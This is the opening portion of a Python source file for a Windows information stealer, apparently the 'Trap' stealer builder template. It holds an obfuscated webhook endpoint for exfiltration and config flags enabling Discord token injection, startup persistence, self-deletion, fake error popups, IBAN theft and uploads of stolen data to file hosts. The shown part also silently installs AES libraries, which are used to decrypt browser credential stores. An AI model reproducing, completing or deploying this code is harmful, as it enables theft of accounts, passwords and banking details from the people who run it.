import sys, time, random, threading, ctypes, string
import os, re, socket, subprocess
import winreg
from urllib.parse import urlparse
from os.path import isfile, exists
from shutil import copy
import sqlite3
from base64 import b64decode
import winreg
import zipfile
from zipfile import ZipFile
import shutil
import tempfile
from sys import executable, stderr
from ctypes import * 
from json import loads, dumps, load, dump
from pathlib import Path
from locale import windows_locale
from importlib import import_module
import datetime


webhook = b'{\xe5\xe5\x86,V\x99\x99\xb0\xfa,\x9c\xe6\xfd\xb0\xc9\x9c\xe6\x90\x99(\x86\xfa\x99\x8f\xb6\xba{\xe6\xe6x,\x99/\x1e==XD=\x18D/\x18/\x7f=/\xb3o==\x99`\xecL\x1f3\xe6b*x\x89\xe1z;L\xa7\x1cL\x87?K\xc3\xb6\x90$\x89z~*@\n\x1e\xa7\xe6X\x81\xba\x1e\x1f\xd7\xc4\xe1\x90\xa8\xc4X0\x87D/\x1c=*\xec\x897\x1e\xb3\r\xa8$$@?\xfd\n\x89\xfa\xe1',b'\xb2\xac\x00Y\x16\x1bvh\x98\\f^>]j\x8a\xb9)wES\x8eG<\xb5%\xf3\xed\x8c\x88\xf2iU\x042\xce\x17\xe4M\x8b\x11\xab\xa4\xb1\xf1k\xc9\x99D/X\x1e\xb3\x18o$=\x7fV\xd6\xc0-l\xd1u@\x87\xc4\xa773\xf6b\x9b`\nK\xc3\xfb\x1f\xe1?\x85\xc1\xa8\x89\xec0~*c\xcf\xa9\xbb\x1a\xd7\xcc(\xba\x9c\xb0\xb6z;{\xfa1xL\x90t\xe6\x86\x1c\xfd,\xe5\r\x0f\x8fH\x14\x81\x93\xdf\xf0\'\x12+\xdcR&9\xbf\xcd\xd9sN \xfe\xaa\xae[F\xd2#"\x05\xd8\xde\x19\x94\xf5\xf4\x97n\xe2\xff\xd4\xf9\xe9\xefy\x84O\x15\x9d\x8d\x10\x02\xb8W\x91\xda\xbe\x1d!\xcb\xb7g\xa1\xa3\xc5B\xf8\x06\xdb\xc7\x0b\x0c84\xfc5\xc2_\tAq\xea\xafZ\xddr6\xeb\x07.\x9e\x9f\x80:\x96\xe7\x01d\x95\xd3\xad\x08\x03\xc6\xe3|\xb4\xe8\xa2Te\xeea\xa5\xf7\x82\x0eQIp}\xd5\x83\xca\x92\xbd\x13C\xa6\xc8J\xd0P\xe0\xbcm\xa0\x9a'
logfile = '%Logfile%'
debug = True
FakeWebhook = True
Fakegen = True 
FakeCCgen = '%FakeCCGen%' 
FakeError = True 
schedule = False
injection = True
Startup = True
antidebugging = False  
DiscordStop = False 
OneTimeSteal = True
melter = True
crasher = False
hidewindow = False
changebio = False
biotext = '%Text%'
Drive = False
close_proc = True
ArchiStealer = True

# WEBSITE UPLOAD 

Gofile = True
fileio = False
catbox = False

# TRAP EXTENSION

trap_extension = "%TrapExtension%"
Iban_Stealer = "%IbanStealer%"

if Startup == False:
    StartupMessage = 'Adding to startup disabled in the config'
else:
    StartupMessage = 'Error while adding Trap into the startup folder' 
    
requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]

def check_path():

    base_dir = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python'

    python_versions = [f for f in os.listdir(base_dir) if f.startswith('Python')]

    for py_ver in python_versions:
        cryptodome_path = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python\\{py_ver}\\Lib\\site-packages\\Cryptodome'
        crypto_path = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python\\{py_ver}\\Lib\\site-packages\\Crypto'
        try:
            if os.path.exists(cryptodome_path):
                shutil.copytree(cryptodome_path, crypto_path, dirs_exist_ok=True)  
        except:
            pass


    
for module in requirements:
    try: 
        import_module(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)
try:          
    try:
        from Cryptodome.Cipher import AES
    except:
        try:
            check_path()
            from Cryptodome.Cipher import AES
        except:
            subprocess.Popen(executable + " -m pip install pycryptodome  ", shell=True)
            from Crypto.Cipher import AES
except:
    pass... (106 KB left)
